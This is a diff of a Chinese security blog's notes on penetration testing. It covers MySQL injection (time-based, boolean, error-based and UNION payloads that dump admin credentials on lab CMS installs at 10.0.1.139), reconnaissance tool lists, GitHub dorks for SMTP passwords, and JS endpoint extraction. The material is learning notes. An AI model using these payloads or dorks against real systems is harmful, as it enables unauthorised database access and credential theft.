+<h2 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h2><p>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要，没有报错和回显都能进行，适用于增删改查里面的增删改<br>and if(1&#x3D;1,sleep(5),0)</p>
+<p>基于布尔：数据库输出判断标准，需要数据回显才能用，仅适用于增删改查里面的查<br>and length(database())&#x3D;6</p>
+<p>基于报错：数据库报错处理判断标准，适用于增删改查里面的增（前提是有报错代码的漏洞例如：or die(mysqli_error($con))）<br>and updatexml(1,concat(0x7e,(SELECT version(),0x7e),1)</p>
+<h2 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h2><p>1、xhcms-insert报错，注入发表评论昵称处<br>‘ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and ‘</p>
+<p>2、kkcms-delete延时，先登录后台<br><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(1&#x3D;1,sleep(5),0)</p>
+<p><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(length(database())&#x3D;6,sleep(5),sleep(0))</p>
+<p><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(ord(left(database(),1))&#x3D;107,sleep(5),sleep(0))</p>
+]]></content>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Web应用&amp;企业产权&amp;指纹识别&amp;域名资产&amp;网络空间&amp;威胁情报</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B91/</url>
+    <content><![CDATA[<h2 id="寻找漏洞补天"><a href="#寻找漏洞补天" class="headerlink" title="寻找漏洞补天"></a>寻找漏洞<a href="https://www.butian.net/">补天</a></h2><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>名称</th>
+<th>地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>企业信息</td>
+<td>天眼查</td>
+<td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td>
+</tr>
+<tr>
+<td>企业信息</td>
+<td>小蓝本</td>
+<td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td>
+</tr>
+<tr>
+<td>企业信息</td>
+<td>爱企查</td>
+<td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
+</tr>
+<tr>
+<td>企业信息</td>
+<td>企查查</td>
+<td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td>
+</tr>
+<tr>
+<td>企业信息</td>
+<td>国外企查</td>
+<td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td>
+</tr>
+<tr>
+<td>企业信息</td>
+<td>启信宝</td>
+<td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td>
+</tr>
+<tr>
+<td>备案信息</td>
+<td>备案信息查询</td>
+<td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td>
+</tr>
+<tr>
+<td>备案信息</td>
+<td>备案管理系统</td>
+<td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td>
+</tr>
+<tr>
+<td>公众号信息</td>
+<td>搜狗微信搜索</td>
+<td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td>
+</tr>
+<tr>
+<td>注册域名</td>
+<td>域名注册查询</td>
+<td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td>
+</tr>
+<tr>
+<td>IP反查</td>
+<td>IP反查域名</td>
+<td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td>
+</tr>
+<tr>
+<td>IP反查</td>
+<td>IP反查域名</td>
+<td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td>
+</tr>
+<tr>
+<td>DNS数据</td>
+<td>dnsdumpster</td>
+<td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td>
+</tr>
+<tr>
+<td>证书查询</td>
+<td>CertificateSearch</td>
+<td><a href="https://crt.sh/">https://crt.sh/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>FOFA</td>
+<td><a href="https://fofa.info/">https://fofa.info/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>全球鹰</td>
+<td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>360</td>
+<td><a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>微步在线 情报社区</td>
+<td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>奇安信 威胁情报中心</td>
+<td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>360 威胁情报中心</td>
+<td><a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></td>
+</tr>
+<tr>
+<td>枚举解析</td>
+<td>在线子域名查询</td>
+<td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td>
+</tr>
+<tr>
+<td>枚举解析</td>
+<td>DNSGrep子域名查询</td>
+<td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td>
+</tr>
+<tr>
+<td>枚举解析</td>
+<td>工具强大的子域名收集器</td>
+<td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>在线cms指纹识别</td>
+<td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>Wappalyzer</td>
+<td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>TideFinger潮汐</td>
+<td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>云悉指纹</td>
+<td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>WhatWeb</td>
+<td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>数字观星Finger-P</td>
+<td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>钟馗之眼</td>
+<td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/?R1nG</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>零零信安</td>
+<td><a href="https://0.zone/">https://0.zone/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>Shodan</td>
+<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>Censys</td>
+<td><a href="https://censys.io/">https://censys.io/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>ONYPHE</td>
+<td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>FullHunt</td>
+<td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>Soall Search Engine</td>
+<td><a href="https://soall.org/">https://soall.org/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>Netlas</td>
+<td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>Leakix</td>
+<td><a href="https://leakix.net/">https://leakix.net/</a></td>
+</tr>
+<tr>
+<td>网络空间</td>
+<td>DorkSearch</td>
+<td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>VirusTotal在线查杀平台</td>
+<td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>VenusEye 威胁情报中心</td>
+<td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>绿盟科技 威胁情报云</td>
+<td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>IBM 情报中心</td>
+<td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>天际友盟安全智能平台</td>
+<td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>华为安全中心平台</td>
+<td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>安恒威胁情报中心</td>
+<td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>AlienVault</td>
+<td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>深信服</td>
+<td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/analysis-platform</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>丁爸情报分析师的工具箱</td>
+<td><a href="http://dingba.top/">http://dingba.top/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>听风者情报源 start.me</td>
+<td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>GreyNoise Visualizer</td>
+<td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>URLhaus 数据库</td>
+<td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td>
+</tr>
+<tr>
+<td>威胁情报</td>
+<td>Pithus</td>
+<td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td>
+</tr>
+</tbody></table>
+<br>
+
+<p><a href="https://forum.ywhack.com/bountytips.php?tools">棱角社区</a></p>
+<p><a href="https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?pli=1">Wappalyzer</a><br><br></p>
+<h2 id="业务资产查询："><a href="#业务资产查询：" class="headerlink" title="业务资产查询："></a>业务资产查询：</h2><p>Web应用</p>
+<p>App应用</p>
+<p>PC端应用</p>
+<p>小程序应用</p>
+<p>微信公众号</p>
+<p>其他产品等<br><br></p>
+<h2 id="Web单域名："><a href="#Web单域名：" class="headerlink" title="Web单域名："></a>Web单域名：</h2><p><strong>备案信息</strong>：查看备案的信息和域名，在公网的都必须备案</p>
+<p><strong>企业产权</strong>：查看产权，有那些App，网站，小程序</p>
+<p><strong>注册域名</strong>：腾讯云搜索注册的域名，查看目标相关域名</p>
+<p><strong>反查解析</strong>：IP地址反查解析，见以上表格网站<br><br></p>
+<h2 id="WEB子域名："><a href="#WEB子域名：" class="headerlink" title="WEB子域名："></a>WEB子域名：</h2><p><strong>证书查询</strong>：仅限于HTTPS的网站，可以搜到后台</p>
+<p><strong>网络空间</strong>：通过使用类似fofa，奇安信，360的网络空间网站来寻找到管理后台</p>
+<p><strong>威胁情报</strong>：情报社区，奇安信查询是否安全的</p>
+<p><strong>枚举解析</strong>：使用字典批量替换前面的域名，暴力破解来查找子域名。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping  www.baidu.com，ping xxx.baidu.com，ping xxxx.baidu.com... <span class="comment">#来暴力破解</span></span><br></pre></td></tr></table></figure>
+
+<p>可以通过接口查询以前用过的子域名，OneForAll子域名收集，集合了其他的工具的总集，很强大，但是没总和网络空间和威胁情报</p>
+<p><strong>指纹识别</strong>：潮汐和云溪指纹识别比较好，看到网站是使用什么搭建的，CDN，操作系统，CMS等等，然后可以寻找搭建软件的漏洞来攻击<br><br></p>
+<h2 id="Web架构资产："><a href="#Web架构资产：" class="headerlink" title="Web架构资产："></a>Web架构资产：</h2><p>程序语言</p>
+<p>框架源码</p>
+<p>搭建平台</p>
+<p>数据库类</p>
+<p>操作系统</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
       </categories>
   </entry>
   <entry>
@@ -426,6 +933,60 @@
 <p>site:Github.com smtp @sina.com.cn </p>
 <p>site:Github.com smtp password </p>
 <p>site:Github.com String password smtp</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B93/</url>
+    <content><![CDATA[<h2 id="什么是JS渗透测试？"><a href="#什么是JS渗透测试？" class="headerlink" title="什么是JS渗透测试？"></a>什么是JS渗透测试？</h2><p>在JavaScript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞</p>
+<p>JS开发的Web应用和PHP，Java，NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在分析JS代码逻辑（加密算法，APIKey配置，验证逻辑等）进行后期安全测试。<br><br></p>
+<p>前提：Web应用可以采用前端或后端语言开发</p>
+<p><strong>后端语言</strong>：PHP Java Python .NET 浏览器端看不到真实的源代码</p>
+<p><strong>前端语言</strong>：JavaScript(JS)和JS框架 浏览器端能看到真实的源代码<br><br></p>
+<p>例子：</p>
+<p>Zblog：核心功能采用PHP语言去写的，例如登录密码加密</p>
+<p>Vue.js：核心功能采用框架语法JS写的，例如登录密码加密，验证码<br><br></p>
+<h2 id="JS安全问题"><a href="#JS安全问题" class="headerlink" title="JS安全问题"></a>JS安全问题</h2><p>源码泄漏</p>
+<p><strong>未授权访问</strong>&#x3D;JS里面分析更多的URL访问确定接口路径，从而进入未授权访问</p>
+<p><strong>敏感Key泄漏</strong>&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</p>
+<p><strong>API接口安全</strong>&#x3D;（代码中加密提交，参数传递，更多的URL路径）<br><br></p>
+<p>如何从表现中的JS提取价值信息</p>
+<p>如何从地址中，Fuzz工具来提取未知的JS文件</p>
+<p>如何从JS开放框架WebPack进行测试<br><br></p>
+<h2 id="流行的JS框架有那些？"><a href="#流行的JS框架有那些？" class="headerlink" title="流行的JS框架有那些？"></a>流行的JS框架有那些？</h2><p>Vue.js, Node.js, jQuery, Angular等<br><br></p>
+<h2 id="如何判定JS开发应用？"><a href="#如何判定JS开发应用？" class="headerlink" title="如何判定JS开发应用？"></a>如何判定JS开发应用？</h2><p>插件Wappalyzer</p>
+<p>源程序代码简短</p>
+<p>引入多个JS文件</p>
+<p>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的JS文件</p>
+<p>一般cookie中有connect.sid<br><br></p>
+<h2 id="如何获取更多的JS文件？"><a href="#如何获取更多的JS文件？" class="headerlink" title="如何获取更多的JS文件？"></a>如何获取更多的JS文件？</h2><p><strong>手工</strong>-浏览器搜索</p>
+<p><strong>半自动</strong>-Burpsuite插件</p>
+<p><strong>工具化</strong>-各类提取&amp;Fuzz项目<br><br></p>
+<h2 id="前端架构-手工搜索分析"><a href="#前端架构-手工搜索分析" class="headerlink" title="前端架构-手工搜索分析"></a>前端架构-手工搜索分析</h2><p>打开检查，网站全局搜索分析</p>
+<p>全局搜索，找连接地址和路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">src=</span><br><span class="line">path=</span><br><span class="line">method:<span class="string">&quot;get&quot;</span></span><br><span class="line">http.get(<span class="string">&quot;)</span></span><br><span class="line"><span class="string">method:&quot;</span>post<span class="string">&quot;</span></span><br><span class="line"><span class="string">http.post(&quot;</span>)</span><br><span class="line">.ajax</span><br><span class="line">http://service.httppost</span><br><span class="line">http://service.httpget</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="前端架构-半自动Burp分析"><a href="#前端架构-半自动Burp分析" class="headerlink" title="前端架构-半自动Burp分析"></a>前端架构-半自动Burp分析</h2><p><strong>插件一</strong>：<a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br>用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，<br>防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。<br><br></p>
+<p><strong>插件二</strong>：<a href="https://github.com/gh0stkey/HaE">HaE</a><br>基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。<br><br></p>
+<h2 id="前端架构-自动化项目分析"><a href="#前端架构-自动化项目分析" class="headerlink" title="前端架构-自动化项目分析"></a>前端架构-自动化项目分析</h2><ol>
+<li><p>用的最多，功能最差的：<a href="https://github.com/Threezh1/JSFinder">JSFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用作快速在网站的JS文件中提取URL，子域名的工具，然后挑选测试，进入，看看能不能未授权访问</p>
+</li>
+<li><p>Jsfinder的升级版：<a href="https://github.com/pingc0y/URLFinder">URLFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用于快速提取检测页面中JS与URL的工具。<br>功能类似于JSFinder，但JSFinder好久没更新了。</p>
+</li>
+<li><p><a href="https://github.com/p1g3/JSINFO-SCAN">JSINFO-SCAN</a>-从表现中JS中提取URL或者敏感数据<br>递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具</p>
+</li>
+<li><p>很好用的浏览器插件：<a href="https://github.com/momosecurity/FindSomething">FindSomething</a><br>从表现中JS中提取URL或者敏感数据<br>该工具是用于快速在网页的html源码或JS代码中提取一些有趣的信息的浏览器插件，<br>包括请求的资源、接口的URL，请求的IP和域名，泄漏的证件号、手机号、邮箱等信息。</p>
+</li>
+<li><p><a href="https://github.com/ffuf/ffuf">Ffuf</a>-爆破找到更多的JS文件分析更多的信息<br>各种字典：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a><br>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</p>
+</li>
+<li><p><a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>-针对JS框架开发打包器Webpack检测，在浏览器插件杂项里面有webpack就能使用这个工具了<br>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具，然后就能生成报告</p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -855,120 +1416,6 @@
       </categories>
   </entry>
   <entry>
-    <title>PHP应用&amp;MYSQL架构&amp;SQL注入&amp;跨库查询&amp;文件读写&amp;权限操作</title>
-    <url>/2024/03/15/Web%E6%94%BB%E9%98%B22/</url>
-    <content><![CDATA[<p><strong>Access无数据库用户</strong></p>
-<p>mysql里面有内置的管理用户，其中root就是默认数据库管理员用户</p>
-<p>网站上面的数据库都在mysql中，由root或一对一用户去管理<br><br></p>
-<p>接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理</p>
-<p><strong>攻击</strong>：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）</p>
-<p>SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)<br><br></p>
-<h2 id="MYSQL注入：（目的获取当前web权限）"><a href="#MYSQL注入：（目的获取当前web权限）" class="headerlink" title="MYSQL注入：（目的获取当前web权限）"></a>MYSQL注入：（目的获取当前web权限）</h2><ol>
-<li>判断数据库的常见四个信息（系统，用户，数据库名，版本）</li>
-<li>根据四个信息去选择方案</li>
-</ol>
-<p><strong>root用户</strong>：先测试读写，能够读写就直接写后门，不能的话就测试获取数据<br><strong>非root用户</strong>：直接测试获取数据<br><br></p>
-<h2 id="PHP-MYSQL-Web组成架构"><a href="#PHP-MYSQL-Web组成架构" class="headerlink" title="PHP-MYSQL-Web组成架构"></a>PHP-MYSQL-Web组成架构</h2><p>服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理<br>可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理</p>
-<ol>
-<li>统一交root用户管理<br><a href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; root &#x3D;&gt;MYSQL<br><a href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; root &#x3D;&gt;MYSQL<br></li>
-</ol>
-<p><strong>数据库统一管理（root用户）</strong><br>每个网站的数据库都由root用户统一管理<br><strong>网站A</strong>：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br><strong>网站B</strong>：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01<br><br></p>
-<p>Mysql<br>&nbsp;&nbsp;&nbsp;root(自带默认)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网站A  testA<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网站B  testB<br><br></p>
-<ol start="2">
-<li>一对一用户管理（推荐）<br><a href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; zblog &#x3D;&gt;MYSQL<br><a href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; demo01 &#x3D;&gt;MYSQL<br>
-<br></li>
-</ol>
-<p><strong>数据库一对一管理（不同用户）</strong><br>自己的网站单独创建数据库用户去管理自己的数据库<br><strong>网站A</strong>：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库zblog用户  zblog<br><strong>网站B</strong>：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库demo用户  demo01<br><br></p>
-<p>Mysql<br>&nbsp;&nbsp;&nbsp;表名A<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名A（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据A<br>&nbsp;&nbsp;&nbsp;表名B<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名B（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据B<br><br></p>
-<p>Access（比Mysql低一级，只能有一个）<br>&nbsp;&nbsp;&nbsp;表名<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据</p>
-<br>
-
-<p><strong>目的</strong>：获取数据<br>肯定一步步得到信息，先数据库名，再表名，再列名<br><br></p>
-<h2 id="PHP-MYSQL-SQL常规查询"><a href="#PHP-MYSQL-SQL常规查询" class="headerlink" title="PHP-MYSQL-SQL常规查询"></a>PHP-MYSQL-SQL常规查询</h2><p><strong>SQL注入获取相关数据</strong>：</p>
-<ol>
-<li>数据库版本-看是否符合information_schema查询：version()</li>
-<li>数据库用户-看是否符合ROOT型注入攻击：user()</li>
-<li>当前操作系统-看是否支持大小写（Linux敏感）或文件路径选择：@@version_compile_os</li>
-<li>数据库名字-为后期猜解指定数据库下的表，列做准备：database()<br>
-<br></li>
-</ol>
-<p><strong>MYSQL5.0以上版本</strong>：自带的数据库名information_schema<br>information_schema：存储数据库下的数据库名及表名，列名信息的数据库<br>information_schema.schemata：记录数据库名信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息表<br><br><br>schema_name：information_schema.schemata记录的数据库名信息<br>table_schema：information_schema.tables记录的数据库名<br>table_name：information_schema.tables记录的表名<br>column_name：information_schema.columns记录的列名</p>
-<br>
-
-<p><strong>注入操作</strong>：</p>
-<ol>
-<li><p>为什么是6？是因为表里面有6个列，实战不知道，折中法慢慢试</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1 order by 6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>页面显示了哪几个数字就是有注入点的地方，没出数字前面加-号可以让他出，显示了2,4,5之后都在这三个地方写注入代码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,5,6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>插入进去看数据库demo01，用户root@localhost</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,database(),user(),6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>插入进去看版本5.7.26，操作系统Win64</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,version(),@@version_compile_os,6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数据库名之前已经知道了，现在需要知道下面有什么表，所以查询demo01下的表名,表名信息借助mysql自带的<br>information_schema.tables存储查询，加上group_concat，查询所有的，显示出三个表名admin,gbook,news</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,group_concat(table_name),5,6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>表名已经知道了，现在需要知道下面有什么列，所以查询admin下的表名）表名信息借助mysql自带的information_schema.columns存储查询，加上group_concat，查询所有的，显示出三个列名username,password,id</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> and table_name=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>知道admin的列名信息，就到最后一步了，使用id&#x3D;1继续往下能获得更多账号密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="built_in">id</span>,3,username,password,6 from admin <span class="built_in">where</span> <span class="built_in">id</span>=1</span><br></pre></td></tr></table></figure></li>
-</ol>
-<br>
-
-<h2 id="PHP-MYSQL-SQL跨库查询"><a href="#PHP-MYSQL-SQL跨库查询" class="headerlink" title="PHP-MYSQL-SQL跨库查询"></a>PHP-MYSQL-SQL跨库查询</h2><p><strong>跨库查询</strong>：<br>只有数据库统一管理才会出现（root用户）<br>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01</p>
-<br>
-
-<p><strong>跨库注入</strong><br>通过B网站的注入点获取A网站的账号密码<br><br></p>
-<p><strong>影响条件</strong>：当前数据库ROOT用户权限<br>如果是注入的是root用户，root用户mysql拥有所有的数据库<br><br></p>
-<p>测试不同数据库用户：root demo<br><strong>跨库查询操作</strong>：</p>
-<ol>
-<li><p>查询所有的数据库名，得到所有的数据库表名之后</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查询数据库名zblog下面的表名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(table_name),6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>查询数据库名zblog下面的zbp_member列名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;zbp_member&#x27;</span> and table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>跨库查询需要加. 查询数据库名zblog下面的zbp_member列名下面的mem_Name和mem_Password</p>
